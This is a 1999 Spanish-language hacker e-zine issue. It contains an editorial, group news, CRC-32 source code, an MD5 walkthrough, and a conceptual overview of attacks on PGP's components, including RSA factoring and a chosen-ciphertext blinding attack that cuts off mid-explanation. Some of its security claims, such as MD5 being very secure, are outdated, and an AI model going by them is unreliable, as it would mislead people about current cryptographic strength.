
                                                ‹‹‹‹  ‹‹‹‹
                ‹€     €‹  ‹€€€€€€               €€    €€
                €€€€   €€  €€                    €€    €€
                €€ €€  €€   €€€€€‹     ‹‹‹‹‹     €€    €€
                €€  €€ €€       €€     ﬂﬂﬂﬂﬂ     €€    €€
                €€   €€€€       €€               €€    €€
                ﬂ€     €ﬂ  €€€€€€ﬂ               €€    €€
                                                ﬂﬂﬂﬂ  ﬂﬂﬂﬂ

             +----------------------------------------------+
             | The NetSearch E-Zine - Numero II - Volumen I |
             |                  24/7/1999                   |
             +----------------------------------------------+


     " United we stand, divided we fall "

                      -Aesop


     " El programa ha efectuado una operacion no valida y sera finalizado "

                                                         - Windows 98


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


+----------------------------------------------------------------------------+
| NOTA: Ninguno de los autores que han colaborado se hacen responsables de   |
|       lo que ignorantes o desaprensivos puedan hacer una vez hayan leido   |
|       sus respectivos articulos.                                           |
+----------------------------------------------------------------------------+


 + INFORMACION ACERCA DE NETSEARCH


 - WEB OFICIAL:
 
                http://members.xoom.com/lynux
 
 - CANAL OFICIAL:

                #netsearch , en el IRC-Hispano

 - MAIL OFICIAL:

                netsearch@hushmail.com

 - DISTRIBUIDORES OFICIALES:

		http://members.xoom.com/lynux
		http://hello.to/hacker_novatos
		http://www.pasanet.es/usuarios/fgarcia/index.html

                (Si quereis distribuir el e-zine, ya sabeis...
                 mailto: netsearch@hushmail.com)

 - LLAVE PGP OFICIAL:

<++> pgpkeys/netsearch.asc !f41d06ff
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDdNtK8RBADmtbXlNKi+UO3lcGNh+aYC3YSWxpEN8mQNw1GNFPafO7Ftmrgm
6Hhb3JLvcbKks4q9yFXK58wmavHWWpSY+9NNKSl+kvePhvQ4yfG8x+fQLuUAYPJB
0XTAsO8diSs0PvpvyLVw2prOHeYJCM1BUN/WNA5oio6tXK3oUIQq0rTndQCg/zy7
xSjIpPpc4ZqXJ6PHPZKAgbcD/3CSW6G6BFubj6pF/Wk4UMpx53ZjdyuPJ2iRvR9S
im4gGsRZfSFQEc2eWc5xb75LO/E50FZTVNQozIYrPfTYPake4T/Y9SA6wPfXF3Nq
0ZD/tzwGcdi2SdzyYLS2jHThkV5UVLyXTwzvK7vAbPJLF/83eUgwvMGoZkRHkeB/
PJ9jA/4gkkt4pEouNQmKmUdp9vWEatiA6Ext61rERcpfo88XDGwrcnb6Mv+VOc02
XUe48tZHlkjyEiB7ifAQs/omFx4VLvhpSnJwM6uamuzNXceNlcrl5OVk2LeC5uTA
p/nQRbU8IqtZ1zxf5Gw5ZDsvv83c4Iq+HtzVZjgiIESo9Nac5rQiTmV0U2VhcmNo
IDxuZXRzZWFyY2hAaHVzaG1haWwuY29tPokASwQQEQIACwUCN020rwQLAwIBAAoJ
EPVhoR6NPrDn9AQAoOJOScrhApVlxNd3160jstjNF+RDAJ4/jWftDyIGQaFaSAR0
Wa7LgjVJYLkCDQQ3TbSvEAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDa
AadWoxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z
4VeSWc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBY
K+X0iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WM
uF040zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmW
n6vQClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAgf+J1V8az258WwN
oq94skl6hgk0nH8spoP+gLHqtVJFwb1zM1O+dwJHSiiEGkwpY72rOijQcbghJ4XF
SNZMIKgqMsVakQRQhoagQ+vrWEGZpZxD42GQX63eJyKgsp6ihcez+arKKScm5NF0
xmkB2un65H3hVjv7gD1g9TyRbIbcqvSmQkEZ5ll+xAMx4gmgziBrrfPoGYBpqAhZ
IfFSIJDruJQSzPtPJpeZelHfeJvAMeLkKVBxT+Mgwftf91o8X/pU7BzhF/NjdsaA
Gu16yjq3AI6+Wn6ovR8pF87VrviiI+vyf82YXmvuVjhpW1qEhGRwTGFdWxE6c4iQ
BhAHgAuz44kARgQYEQIABgUCN020rwAKCRD1YaEejT6w58kRAKCvCnP3pzN64IOF
HgCtgNhYwXNzIQCeIKD1tbTqiBYZVFBG9mVdKhkPOGw=
=PjV/
-----END PGP PUBLIC KEY BLOCK-----
<-->


 - COLABORACIONES:

                * cafo       - encmesiah@bigfoot.com
                * Sp4rK      - sp4rk@undersec.com
		* RaiSe      - raise@biogate.com
                * MegadetH   - crazyjm@beer.com
                * MoebiuZ    - moebiuz@biogate.com
                * DarK FeaR  - darkfear@hotpop.com
                * [LsD]-MT   - dafo@arrakis.es
                  (Traduccion del e-zine a formato HTML)

 - SALUDOS:

		* - J.J.F. / HACKERS TEAM -
		* SET
                * UnderSec / NGS Team
                * A la gente que colaboro con nuestro primer numero
                  (Ulandron, cafo, RaiSe, MegadetH y MoebiuZ)


 - RECOMENDADO EL USO DEL EDIT DE MS-DOS O EL JED DE LINUX.


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


 + INDICE:


   +-------------------------------------------------+---------------+
   |                     TITULO                      |     AUTOR     |
   |-------------------------------------------------+---------------|
   | + Editorial                                     |   DarK FeaR   |
   |-------------------------------------------------+---------------|
   | + NetSearch al Habla                            |   NetSearch   |
   |-------------------------------------------------+---------------|
   | + Criptografia (II)                             |   cafo        |
   |-------------------------------------------------+---------------|
   | + xDSL y otras alternativas de conexion         |   Sp4rK       |
   |-------------------------------------------------+---------------|
   | + Curso de Programacion en Pascal (II)          |   DarK FeaR   |
   |-------------------------------------------------+---------------|
   | + Desbordamiento de la pila                     |   RaiSe       |
   |-------------------------------------------------+---------------+
   | + Breves sobre SATAN                            |   MegadetH    |
   |-------------------------------------------------+---------------|
   | + Iniciacion a los Virus de Macro (II)          |   MoebiuZ     |
   |-------------------------------------------------+---------------|
   | + Correo Fresco                                 |   Lector@s    |
   |-------------------------------------------------+---------------|
   | + Llaves PGP                                    |   NetSearch   |
   |-------------------------------------------------+---------------|
   | + Fuentes del NetExt                            |   cafo        |
   |-------------------------------------------------+---------------|
   | + Despedida                                     |   NetSearch   |
   +-------------------------------------------------+---------------+


==============================================================================
------------------------------------------------------------------------------
==============================================================================


                          +---------------------+
                          | .oO  Editorial  Oo. |
                          +---------------------+

     Buenas gente. Pensabais que no ibamos a volver? jeje, pues hemos vuelto,
y con mas fuerza xD (donde habre visto yo eso ;). Por lo visto el e-zine
ha tenido una buena aceptacion, lo que nos ha animado a continuar con el.
Tenemos muchas cosas que contaros respecto a lo que ha pasado ultimamente
en lo que concierne a NetSearch, pero eso ya tiene su seccion :P. Otra cosa,
vamos a ver, es que a lo mejor no se me entendio bien y tal...

 !!! NECESITAMOS VUESTRAS COLABORACIONES !!!

... ahora? Lo dicho, ademas de las colaboraciones "internas" necesitamos que
gente que nos lee (hay alguien? :P) escriba articulos. No esperamos
colaboraciones masivas con doscientos mil articulos por segundo pero con
tres o cuatro por numero nos conformamos ;)

     La seccion de Correo Fresco no ha tenido mucho exito (como era de
esperar, por otra parte) asi que en este numero quedara "en suspension",
esperando que para el numero 3 (que lo habra, vamos si lo habra ;) tenga
mas exito. Solo deciros que recibimos 2 mails, el primero, mandaba un
articulo pero, a causa de que ya habia salido en otro e-zine, decidimos
no repetirnos (por cierto, saludos HooK). El segundo tiene relacion con la
siguiente seccion (NetSearch al habla) y el reto del RC5-64... bueno no os
lo adelanto, si tanto os interesa saltad directamente a la siguiente
seccion :P

Espero que os guste este segundo numero,

                                DarK FeaR
                              - El editor -

==============================================================================
------------------------------------------------------------------------------
==============================================================================


                      +------------------------------+
                      | .oO  NetSearch al habla  Oo. |
                      +------------------------------+

     Que hay de nuevo por NetSearch? buff... muchas cosas, en este corto
periodo de tiempo han pasado bastantes cosas, pero podemos resumirlas en
tres, yo creo que las tres de bastante importancia.

     Empecemos. Os las explicare por orden cronologico :P. La primera,
tiene relacion directa con cafo. Como ya se ha explicado en la lista de
correo, cafo ha rediseÒado el extract de la phrack. El programa, en un
principio tenia la funcion de buscar por un archivo de texto unas
determinadas etiquetas. Una vez encontradas, el contenido que se hallara
entre la etiqueta de inicio y la de fin seria extraido a un archivo aparte
cuya ruta se encontraba tambien definida. Hasta aqui no ha habido ningun
cambio. Lo que cafo ha hecho ha sido darle la capacidad al programa de hacer
la comprobacion del crc32 al archivo a extraer, asegurando asi su integridad
y veracidad. Asi que si enviais un articulo al e-zine, y este contiene
algun codigo fuente o cualquier cosa a extraer, los pasos que debeis realizar
son los siguientes:

1- "Pasarle" al archivo que incluireis en el articulo el programa crc-32b,
    cuyas fuentes las podeis encontrar en el articulo sobre criptografia
    de cafo. Este programa os dara el crc32 del archivo.

2- Pegad el archivo en el articulo y poned al principio la entiqueta <++>
   y al final la etiqueta <--> (Tened en cuenta el EOF).

3- A la derecha de la etiqueta <++>, y separado por un espacio, el path
   donde se extraera el archivo (algo asi como prueba/prueba.c).

4- A la derecha del path y separado de nuevo por un espacio, un signo de
   admiracion (!) y inmediatamente despues el crc32 que os dio anteriormente
   el crc-32b.

Mas o menos, en la practica quedaria algo asi:

<++> ejemplo/ejemplo.txt !9f0e8db9

Esto es una prueba de extraccion con el netext.

<-->

Creo que ha quedado mas claro con el ejemplo :).


      La segunda. Como todos sabeis NetSearch cuenta desde hace un tiempo
con un equipo que participa en el reto del RC5-64 de distributed.net. Pues
bien, desde hace poco nos encontramos en batalla contra los grandes de la
scene :P. Si, estamos en la liguilla de e-zines de habla hispana que lleva
SET. En esa liga participan, ademas de otros, SET y - J.J.F. / Hackers Team -.
Esto no ha hecho sino animarnos mas y desde hace unas semanas el equipo de
NetSearch no hace mas que aumentar puestos (+NetBul, mirate las estadisticas
:P). Asi que ya podeis empezar a temblar (buuuu xD). Venga, os recordamos que
podeis uniros a nuestro equipo si asi lo deseais (es mas, os lo pedimos :P).
El numero de identificacion es el 11007. Si no sabes como va todo este rollo
pasate por la pagina de NetSearch (http://members.xoom.com/lynux) y le echas
un vistazo a la seccion RC5.


     Y... hablando de la pagina, nos metemos de lleno en el tercer tema de
la seccion ;). A causa de la falta de tiempo que a muchos nos acosa (joer
que bien me ha quedao eso :), Skweez, Webmaster de NetSearch hasta hace
unos dias, ha decidido dejar su puesto. De paso quiero agradecer a Skweez
su trabajo durante 8 meses al cargo de la web. Pues bien, nos pusimos a
buscar un substituto, y MoebiuZ se intereso por el puesto. Finalmente
decidimos que asi seria y que MoebiuZ quedaria a cargo de la web.
Y aprovechando la oleada de cambios, se renovo tambien el diseÒo y el
contenido de la web. Esperamos que la nueva apariencia y contenidos os
guste, y, como ya sabeis, para cualquier sugerencia: netsearch@hushmail.com.

[NOTA: de momento, y al estar en plena construccion la nueva web, podeis
       encontrar un preview en http://members.tripod.com/neogenesys , siendo la
       antigua, de momento, totalmente operativa ]

     Pues de momento, nada mas que explicaros. Os invito a que os paseis
por #netsearch, en el IRC-Hispano (si si si, el de los splits a garrafas :)
y animeis el ambiente.

Nos vemos.


==============================================================================
------------------------------------------------------------------------------
==============================================================================


                       +-----------------------------+
                       | .oO  Criptografia (II)  Oo. |
                       +-----------------------------+


Criptografia  (y 2)
====================
by cafo
-------

Holas a todos de nuevo.

Posiblemente muchos de vosotros me habrei crucificado por el articulo
anterior, ya que hasta yo reconozco que se daba un salto muy grande en la
dificultad de los algoritmos explicados pero, como dije en su momento, el que
pueda hacerlo mejor que lo haga y me mande una copia ;)

En este segundo numero voy a seguir explicando algoritmos de criptografia y
alguno mas que, como el crc, no son sistemas criptograficos propiamente dichos
pero como nos lo estamos encontrando continuamente, siempre es bueno saber que
hacer con ellos (y como modificarlos llegado el caso), aparte de una breve
introduccion a los ataques que se pueden efectuar contra el PGP.
Concretamente, en este articulo voy a tratar:
	     
		crc32 ->  Metodo de verificacion de informacion.
		md5   ->  Uno de los estandares de la criptografia moderna.
		Ataques contral el PGP -> eso mismo.
		
Es cierto que es bastante escaso, pero por ahora no tengo tiempo para hacer 
otra cosa, y mas teniendo en cuenta que los algoritmos que me gustaria 
explicar (lease blowfish, twofish, ECC y demas) son bastante densos y 
dificiles de transcribir a un articulo a partir de sus especificaciones 
originales (por poner un ejemplo, el documento original en ingles del twofish 
ocupa 68 paginas de explicaciones sobre todos los cambios de bits que realiza 
el algoritmo). En cualquier caso mi intencion es explicarlos, asi que muy 
probablemente los vereis en el proximo numero.


(Para cualquier duda sobre el absurdo y repetitivo desclaimer que deberia
aparecer aqui, os remito al numero uno de Netsearch E-zine, que me salio 
muy aparente :)


SeÒoras y seÒores; empecemos.

 crc32 o Cicle Redundant Check de 32 bits
==========================================

Antes de nada, decir que existe una version de 16 bits (obviamente mas simple)
pero como ultimamente no lo he visto en ningun programa ni algortimo decente
voy a pasar de el. Si alguien tiene especial interes que lo diga, a ver que
podemos hacer para el proximo numero.

Veamos el concepto.
Desde el inicio de las comunicaciones se ha necesitado verificar que lo que
se ha recibido es efectivamente lo que el emisor ha mandado. Historicamente
se han utilizado muchos medios 'fisicos' para asegurar la identidad del 
remitente (todos nos acordamos del tipico sello de cera para lacrar los
sobres, no?), pero este no es nuestro rollo. Vayamos directamente a la epoca
de la informatica.
Todos sabreis que los modems convierten la informacion digital en analogica
y viceversa. Esto en la practica significa que por cada bit el modem crea
un 'tono' que manda por la linea telefonica, que es en realidad una seÒal
electrica de una determinada frecuencia e intensidad.
Para asegurar que las comunicaciones se iban sucediendo sin incidentes se
ideo un sistema que hacia un recuento cada pocos bits de lo que se habia 
mandado, se sumaba, y si el numero era par se enviaba un 1 y si no un 0
(esta es la explicacion de lo que es el famoso Parity Bit que todos los
que descendemos de las BBS recordamos).

En esencia esto estaba muy bien para modems de 1200 bps y menores.
A partir de esa velocidad, si en la linea habia problemas era muy facil que 
entre dos bits de control se enviara mas de un bit 'desviado' con lo que
tenias el 50% de probabilidades de que el bit de paridad fuera correcto o no
(recordemos que un modem normalito de ahora deberia hacer esto mismo 33.600
veces por segundo, con la incertidumbre que conllevaria si existieran 
problemas en la linea).

Asi que coincidiendo con el aumento de velocidad de los modems y de la rapidez
de calculo de los equipos se creo un sistema para asegurar que lo que se
envia es lo que se recibe.

Conceptualmente consiste en coger un fragmento de informacion y hacerle
multiples pasadas con este algoritmo (por eso de Ciclico del nombre) para
asegurar que tomamos todos los bits de informacion, y sacar de ellos un numero
que se envia justo antes o despues del paquete de informacion. El algoritmo
esta realizado de manera que si se cambia un solo bit del paquete el numero
no de igual, con lo que se consigue que el receptor sepa automaticamente si 
el paquete que ha recibido es correcto o no aplicandole el algoritmo y 
comparando el resultado con el numero recibido, y si algo falla se vuelve a 
pedir ese determinado paquete y se hace otra vez la comprobacion.

Esto es lo que se utilizaba en los protocolos como Zmodem y demas, pero 
se vio que era tan eficaz que se decidio utilizarlo en cualquier situacion
en la que se requiriera precision a nivel de bits, como por ejemplo en 
los archivos comprimidos (esto es lo que se utiliza en los ZIP para 
comprobar la integridad del archivo).

Pues bien. En definitiva lo que hace el crc es coger un numero determinado
de bytes y mediante una serie de operaciones estandars (esto es, que no 
utilicen funciones dependientes del sistema operativo) saca un numero de 
32 bits (4 bytes) de forma que se tengan en cuenta todos y cada uno de 
los bits del mensaje. Como vereis en el programa que dejo mas abajo,
estas operaciones son 'sencillos' XOR's, AND's y por eso paso de 
explicarlos. Que cada uno lo mire y lo entienda ;) . Como vereis, es el mismo
que mande a la lista, porque me parece mas corto que los demas que usan una
tabla predefinida para las operaciones (en realidad este tb usa la misma
tabla, pero lo tiene todo resumido en una funcion)

<++> cripto_II/crc-32b.c !5ddcfc94
/*  CRC-32b version 1.03 by Craig Bruce, 27-Jan-94
**
**  Based on "File Verification Using CRC" by Mark R. Nelson in Dr. Dobb's
**  Journal, May 1992, pp. 64-67.  This program DOES generate the same CRC
**  values as ZMODEM and PKZIP
**
**  v1.00: original release.
**  v1.01: fixed printf formats.
**  v1.02: fixed something else.
**  v1.03: replaced CRC constant table by generator function.
*/

#include <stdio.h>

int main();
unsigned long getcrc();
void crcgen();

unsigned long crcTable[256];

/****************************************************************************/
int main( argc, argv )
	int argc;
	char *argv[];
{
	int	i;
	FILE   *fp;
	unsigned long crc;

	crcgen();
	if (argc < 2) {
		crc = getcrc( stdin );
		printf("crc32 = %08lx for <stdin>\n", crc);
	} else {
		for (i=1; i<argc; i++) {
			if ( (fp=fopen(argv[i],"rb")) == NULL ) {
				printf("error opening file \"%s\"!\n",argv[i]);
			} else {
				crc = getcrc( fp );
				printf("crc32 = %08lx for \"%s\"\n",
					crc, argv[i]);
				fclose( fp );
			}
		}
	}
	return( 0 );
}

/****************************************************************************/
unsigned long getcrc( fp )
	FILE *fp;
{
	register unsigned long crc;
	int c;

	crc = 0xFFFFFFFF;
	while( (c=getc(fp)) != EOF ) {
		crc = ((crc>>8) & 0x00FFFFFF) ^ crcTable[ (crc^c) & 0xFF ];
	}
	return( crc^0xFFFFFFFF );
}

/****************************************************************************/
void crcgen( )
{
	unsigned long	crc, poly;
	int	i, j;

	poly = 0xEDB88320L;
	for (i=0; i<256; i++) {
		crc = i;
		for (j=8; j>0; j--) {
			if (crc&1) {
				crc = (crc >> 1) ^ poly;
			} else {
				crc >>= 1;
			}
		}
		crcTable[i] = crc;
	}
}

<-->

 MD5
=====

Veamos. El md5 puede ser considerado un primo lejano del crc32 (en el sentido
de que tambien son primos los gatitos y los leones ;). 

El md5 lo que hace es coger un mensaje de un determinado numero de bits
(que no tienen por que ser multiplo de 8, es decir, que no tienen que 
ser caracteres) y saca un numero de 128 bits, "fingerprint" de ese mensaje
("huella dactilar" para los que no dominen el ingles). La utilidad es obvia.
Aparte de poder firmar los mensajes sin posibilidad de equivocarse, permite 
hacer cheksums en un sistema criptografico que trabaja exclusivamente con bits
(con la posibilidad de errores que eso conlleva).

Este sistema salio como respuesta al descubrimiento de una formula para
'arrasar' el md4 en tan solo un minuto usando un PC normalito mediante ataques
por colision (ver mas abajo el apartado de los ataques al PGP). El md5, aunque
sea un poco mas lento que el md4 (que habia sido diseÒado para ser 
super-rapido) y estar basado en el, es muchisimo mas seguro ya que cambia
algunas funciones 'simetricas' del md4 por unas nuevas que no dependen de
tablas de cambio de bits. Teoricamente hay una contra 2^64 posibilidades 
de que el algoritmo saque el mismo resultado para dos mensajes diferentes
y una contra 2^128 de que un mensaje modificado pueda dar el mismo resultado. 

En la practica, aparte de para firmar mensajes, el MD5 se usa para mezclar
la clave que hemos proporcionado (passphrase) dentro de la llave IDEA.

Vamos a ver como funciona en 5 pasos:

Supongamos que tenemos un mensaje de 'b' bits de longitud ('b' es un numero
positivo o 0, no necesariamente multiplo de 8 como comente antes).

- Paso 1.
 El mensaje es 'extendido' para que su longitud + 448 sea multiplo de 512
 (esta extension se realiza incluso cuando 'b' + 448 es de por si divisible
 por 512).
 Esta extension se realiza de un modo muy sencillo: se aÒade un bit '1' al
 mensaje y despues se rellena con '0' hasta que se cumpla la condicion de 
 arriba. Asi, siempre se aÒade un bit como minimo y 512 como maximo.

- Paso 2.
 Se aÒade a lo de antes una representacion de 64 bits de la longitud de
 'b' antes de realizar el paso anterior. En el caso de que un mensaje
 sea mayor que 2^64 bits, se aÒaden solo los 'words' (grupos de 32 bits)
 correspondientes a su longitud en 64 bits (el resto se desprecia).
 Llegado a este punto tenemos un mensaje que es exactamente divisible por 
 512 gracias a las precauciones que hemos tomado antes.

- Paso 3.
 Creamos un buffer de cuatro word (32 bits cada uno) con los siguientes
 valores en hexadecimal:

	  word A: 01 23 45 67
          word B: 89 ab cd ef
          word C: fe dc ba 98
          word D: 76 54 32 10

- Paso 4. (aqui viene lo gordo ;)
 Primero definimos cuatro funciones auxiliares que tomen tres entradas de 32
 bits y den una salida de 32 bits:
	  
	  F(X,Y,Z) = XY v not(X) Z
          G(X,Y,Z) = XZ v Y not(Z)
          H(X,Y,Z) = X xor Y xor Z
          I(X,Y,Z) = Y xor (X v not(Z))

 A ver que significa esto (doy las claves de las operaciones):
       XY      ->  AND entre X e Y
       X v Y   ->  OR entre X e Y
       not(X)  ->  NOT a X
       X xor Y ->  (facil, no?) se hace un XOR entre X e Y.

 Para todas las operaciones siguientes usaremos una tabla construida mediante
 la funcion seno.
 Empezamos:

    /* Se procesan cada bloque de longitud 16 words. */
    For i = 0 to N/16-1 do

     /* Copiamos el bloque i en X. */
     For j = 0 to 15 do
       Set X[j] to M[i*16+j].
     end 

     /* Salvamos A como AA, B como BB, ... */
     AA = A
     BB = B
     CC = C
     DD = D

     /* Round 1. */
     /* [abcd k s i] expresa la operacion:
          a = b + ((a + F(b,c,d) + X[k] + T[i]) <<< s). 
	  NOTA: <<< s representa la operacion de rotar circularmente los bits
		de X, s veces */
     
     [ABCD  0  7  1]  [DABC  1 12  2]  [CDAB  2 17  3]  [BCDA  3 22  4]
     [ABCD  4  7  5]  [DABC  5 12  6]  [CDAB  6 17  7]  [BCDA  7 22  8]
     [ABCD  8  7  9]  [DABC  9 12 10]  [CDAB 10 17 11]  [BCDA 11 22 12]
     [ABCD 12  7 13]  [DABC 13 12 14]  [CDAB 14 17 15]  [BCDA 15 22 16]

     /* Round 2. */
     /* [abcd k s i] ahora expresa:
          a = b + ((a + G(b,c,d) + X[k] + T[i]) <<< s). */
   
     [ABCD  1  5 17]  [DABC  6  9 18]  [CDAB 11 14 19]  [BCDA  0 20 20]
     [ABCD  5  5 21]  [DABC 10  9 22]  [CDAB 15 14 23]  [BCDA  4 20 24]
     [ABCD  9  5 25]  [DABC 14  9 26]  [CDAB  3 14 27]  [BCDA  8 20 28]
     [ABCD 13  5 29]  [DABC  2  9 30]  [CDAB  7 14 31]  [BCDA 12 20 32]

     /* Round 3. */
          /* [abcd k s t] --->
          a = b + ((a + H(b,c,d) + X[k] + T[i]) <<< s). */
     
     [ABCD  5  4 33]  [DABC  8 11 34]  [CDAB 11 16 35]  [BCDA 14 23 36]
     [ABCD  1  4 37]  [DABC  4 11 38]  [CDAB  7 16 39]  [BCDA 10 23 40]
     [ABCD 13  4 41]  [DABC  0 11 42]  [CDAB  3 16 43]  [BCDA  6 23 44]
     [ABCD  9  4 45]  [DABC 12 11 46]  [CDAB 15 16 47]  [BCDA  2 23 48]

     /* Round 4. */
     /* [abcd k s t] es, despues de todo,
          a = b + ((a + I(b,c,d) + X[k] + T[i]) <<< s). */
    
     [ABCD  0  6 49]  [DABC  7 10 50]  [CDAB 14 15 51]  [BCDA  5 21 52]
     [ABCD 12  6 53]  [DABC  3 10 54]  [CDAB 10 15 55]  [BCDA  1 21 56]
     [ABCD  8  6 57]  [DABC 15 10 58]  [CDAB  6 15 59]  [BCDA 13 21 60]
     [ABCD  4  6 61]  [DABC 11 10 62]  [CDAB  2 15 63]  [BCDA  9 21 64]

     /* Hacemos las siguientes sumas */
     A = A + AA
     B = B + BB
     C = C + CC
     D = D + DD
 
 y ...

- Paso 5.
 Este es el que se encarga de la salida de todo el proceso, y es simplemente
 A,B,C y D empezando por el primer byte de A y terminando por el ultimo de 
 D (vale, puede que parezca una redundancia, pero no lo es :)

Pues esto es todo amigos. Aqui se acaba la descripcion del md5, y si la he 
hecho tan detallada es para que sepais de que estoy hablando cuando mencione
las formas de ataque al PGP mas abajo.


 Atacando al PGP
=================

	IMPORTANTE: es posible que lo que viene a continuacion lo hayais
		    leido en algun otro e-zine. No lo se y no tengo 
		    tiempo (ni por supuesto ganas) de leermelos todos
		    para comprobarlo. De todas formas no tengo reparo en 
		    admitir que es una traduccion cuasi-literal del original
		    al que podeis acceder en:

		    http://axion.physics.ubc.ca/crypt.html

		    y si lo incluyo es para dar una perspectiva de lo que
		    hay que hacer para romper uno de estos algoritmos
		    (y que alguno de vosotros ya esta intentando hacer con el
		    RC5)


En este apartado voy a intentar resumir los diferentes tipos de ataques que
se pueden realizar contra nuestro querido sistema de criptografia publica
(NOTA: en esta explicacion voy a usar la notacion que use en el numero 1
       para que los que lo leyeron puedan seguir el articulo con una minima
       base)

Empecemos con un resumen de lo que es el PGP.
Como ya comente en al numero pasado, el PGP es un sistema criptografico
hibrido, es decir, que no utiliza exclusivamente un solo algortimo para sus
fines. Concretamente, el PGP esta compuesto por una funcion de cifrado 
simetrico (IDEA), una funcion de cifrado asimetrico (RSA), una funcion
hash de una sola direccion (MD5) y un generador de numeros aleatorios (PRNG, 
por eso de Pseudo Random Number Generator). Si os extraÒa que el PGP os pida
que introduzcais texto al azar para generar los numeros primos teniendo ya
un generador de numeros aleatorios, solo comentare ahora que lo que vosotros
introducis se utiliza como inicio (o semilla utilizando la jerga computacional)
de la funcion creadora de los numeros aleatorios.

Pues bien, como siempre es mas probable encontrar alguna debilidad en alguna
parte que en el conjunto entero, vamos a ver los ataques que se pueden
realizar con cada una de las partes del PGP.

  ataques contra  IDEA
 ----------------------
 Este apartado va a ser muy corto ;-)
 El IDEA se acabo de perfilar en 1992 y hasta la fecha no ha habido avances 
 significativos en su criptoanalisis (por lo menos que se hayan hecho
 publicos, lo que hagan los chicos de la NSA con el no podemos saberlo,
 verdad?), por lo que el unico ataque posible es el de la fuerza bruta, es
 decir, probar con todas las posibles combinaciones hasta encontrar la
 correcta.
 
 Pues lo de siempre: se necesitaria la edad del universo para considerar 
 todas las posibilidades.
 
 En conclusion, hasta la fecha IDEA no es vulnerable. 

  ataques contra el RSA
 -----------------------

 El RSA ya esta explicado en el articulo anterior. De todas formas vamos a
 resumirlo rapidamente para no perdernos:
  - Se buscan dos numeros primos 'm' y 'n' muy grandes (mas de 100 cifras)
  - Se busca el producto de 'm' y 'n', 'k'
  - 'e' y 'd' son respectivamente las claves de encriptacion y desencriptacion
  - 'd' es un numero natural coprimo con el producto (m-1)(n-1)
  - 'e' es uno de los maximos divisores comunes entre 'd', (m-1) y (n-1)
  - las claves publicas y privadas son respectivamente (e,k) y (d,k), esto es,
    una combinacion de las claves de encriptacion con el producto de m y n.
  - 'm' y 'n' no deben conocerse para garantizar la seguridad.
  - La funcion de encriptacion se da como E = t^e mod k == C y la de 
    desencriptacion como D = C^d mod k donde 't' es el mensaje original y 'C'
    es el texto cifrado (lo que mandamos por correo :)
 
 Despues de este breve repaso vamos a ver las posibilidades de ataque.

	 1.- Fuerza bruta.
	 -----------------
   En un ataque corriente el atacante lo unico que tiene es la clave publica
   con la que se ha encriptado un mensaje, esto es, tiene 'e' y 'k' y lo que
   necesita es descubrir la clave privada, es decir, lo que esta intentando
   averiguar es 'd'. El mejor metodo conocido hasta la fecha para encontrar
   'd' mediante fuerza bruta es la factorizacion de 'k', ya que sabiendo
   sus factores (es decir, conociendo 'm' y 'n') se puede encontrar 'd' como
   numero coprimo de ambos (si estais pensando en deducir 'd' a partir de
   (m-1) y (n-1) olvidadlo porque a esos niveles de cifras la dificultad se
   hace exponencial a la cantidad de cifras). Ahora os pongo el nombre de los
   algoritmos mas comunes para factorizar 'k' por si teneis interes en 
   buscarlos. Solo tengo que advertir que los he puesto en orden de velocidad
   creciente, por lo que si lo que quereis es una ayuda en la programacion
   de vuestro propio algoritmo, os aconsejo que cojais el primero y lo 
   estudieis:
	- Trial division (prueba de divisiones sucesivas): es el mas antiguo
	       y sencillo, y tambien el menos eficiente. Su crecimiento es
	       exponencial y se basa en probar todos los numeros primos
	       menores que la raiz cuadrada de 'k'.
	- Quadratic Sieve (QS para buscarlos en los motores de busqueda):
	       es el algortimo mas rapido para numeros de menos de 110 cifras.
	- Multiple Polynomial Quadratic Sieve (MPQS): lo mismo pero mas
	       rapido.
	- Double Large Prime Variation of the MPQS (tiene otro nombre, pero
	       con este lo he encontrado muy facilmente en altavista ;): mas
	       rapido todavia.
        - Number Field Sieve (NFS };-): por ahora el algoritmo mas rapido para
	       numeros de mas de 110 cifras.
   
   De este tipo de ataques solamente decir que las teorias matematicas avanzan
   muy rapido y es facil que se encuentren nuevos algoritmos para mas de 110
   cifras que sean mucho mas eficientes. Es mas, como todos sabreis, Aid
   Shamir (el que puso la 'S' a la RSA) desvelo el 4 de mayo el prototipo
   de una maquina que era capaz de superar a un superordenador en la 
   factorizacion de claves de menos de 512 bits por un precio muchisimo menor.

	2.- Ataques no directos.
	------------------------
   Como podreis imaginar, estos ataques no se basan en algun fallo del 
   algoritmo sino que buscan algun error en la implementacion del mismo. Como
   el PGP ha demostrado no tener estos errores, pasamos de ellos.

	3.- Ataque de texto cifrado.
	----------------------------
   En esta ocasion el atacante lo que quieres es descifrar un texto en 
   particular que haya cogido, por ejemplo, espiando las comunicaciones de la
   victima. En otras palabras, lo que esta buscando es el texto 't', es decir,
   C^d de la formula de desencriptacion (damos por supuesto que el atacante 
   posee la clave publica de la victima, o sea, que posee 'e' y 'k').
   
   Lo que hace el ataque es elegir un numero al azar 's' menor que 'k' y 
   despues sigue estos pasos:
	a) se encripta 's' con la clave publica que tiene ( X = s^e mod k)
	b) Multiplicamos el texto cifrado 'C' con la formula que hemos 
	   obtenido antes: Y = XC mod k 
	c) hacemos la inversa de 's mod k': R = s^-1 mod k
   Ahora, conociendo el hecho que si 'X = s^e mod k', entonces 's = X^d mod k'
   (repasad la teoria del articulo anterior ;), lo unico que tiene que hacer 
   el atacante es conseguir que la victima le firme Y (los documentos se 
   firman con la clave privada) con lo que ya tendria 'U=Y^d mod k' (esto 
   es Y con la firma correspondiente de la victima) y ya lo tendriamos todo
   hecho. Lo unico que habria que hacer son unas simples operaciones:

